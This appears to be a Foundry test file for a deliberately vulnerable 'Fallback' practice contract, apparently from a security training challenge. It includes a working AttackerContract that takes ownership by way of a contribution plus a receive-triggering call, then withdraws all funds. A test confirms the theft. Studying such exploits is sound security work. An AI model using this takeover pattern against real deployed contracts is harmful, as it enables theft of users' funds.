
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";
import {DeployFallback} from "../script/DeployFallback.s.sol";

contract TestFallback is Test {

    Fallback fback;
    DeployFallback deployer;

    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");
    address public user = makeAddr("user");
    

    function setUp() external {
        deployer = new DeployFallback();
        fback = deployer.run();
        vm.deal(user,10 ether);
    }

    function testOwnerAndContributions() external {
        vm.startPrank(owner);
        assertEq(fback.owner(), owner);
        assertEq(fback.getContribution(), 1000 * 1 ether);
        vm.stopPrank();
    }

    function testContributeFunction() external {
        vm.startPrank(user);
        fback.contribute{value: 0.0001 ether}();
        assertEq(fback.getContribution(), 0.0001 ether);
        vm.stopPrank();
    }

    modifier multipleContributes {
        address[] memory users = new address[](10);
        for (uint i = 0; i < 10; i++) {
            users[i] = address(uint160(i + 1));

            vm.startPrank(users[i]);
            vm.deal(users[i],10 ether);
            fback.contribute{value: 0.0001 ether}();
            vm.stopPrank();
        }
        _;
    }

    function testOnlyOwnerCanWithdrawAndNonOwnerCannot() external multipleContributes {
        vm.startPrank(user);
        vm.expectRevert();
        fback.withdraw();
        vm.stopPrank();

        vm.startPrank(owner);
        uint256 balanceOfFallbackContract = address(fback).balance;
        fback.withdraw();
        assertEq(balanceOfFallbackContract,address(owner).balance);
        vm.stopPrank();
    }

    function testAttackerCanTakeOwnershipAndStealAllFunds() external multipleContributes {
        vm.startPrank(attacker);
        vm.deal(attacker, 0.1 ether);
        AttackerContract attackerContract = new AttackerContract(fback, attacker);

        uint256 attackerContractBalanceBeforetheAttack = address(attackerContract).balance;
        uint256 fallbackContractBalanceBeforetheAttack = address(fback).balance;

        attackerContract.attack{value: 0.1 ether}();

        uint256 attackerContractBalanceAftertheAttack = address(attackerContract).balance;
        uint256 fallbackContractBalanceAftertheAttack = address(fback).balance;

        console2.log("Attacker Contract Balance Before the Attack: ", attackerContractBalanceBeforetheAttack);
        console2.log("Fallback Contract Balance Before the Attack: ", fallbackContractBalanceBeforetheAttack);

        console2.log("Attacker Contract Balance After the Attack: ", attackerContractBalanceAftertheAttack);
        console2.log("Fallback Contract Balance After the Attack: ", fallbackContractBalanceAftertheAttack);

        assertEq(attackerContractBalanceBeforetheAttack, fallbackContractBalanceAftertheAttack);
        assertEq(attackerContractBalanceAftertheAttack, fallbackContractBalanceBeforetheAttack + 0.1 ether);

        vm.stopPrank();
    }

}


contract AttackerContract {

    Fallback fallbackContract;
    address private immutable attacker;

    modifier onlyOwner {
        if (msg.sender != attacker) {
            revert("You're Not Owner!");
        }
        _;
    }

    constructor(Fallback _fallbackContract, address _attacker) {
        fallbackContract = _fallbackContract;
        attacker = _attacker;
    }

    function attack() external payable {
        fallbackContract.contribute{value: 0.0001 ether}();
        (bool success,) = address(fallbackContract).call{value: 0.000001 ether}("");
        require(success,"Low Level Call Failed!");
        fallbackContract.withdraw();
    }

    function withdrawContractBalance() external {
        uint256 thisContractBalance = address(this).balance;
        payable(attacker).transfer(thisContractBalance);
    }

    receive() external payable {

    }

    fallback() external payable {

    }

}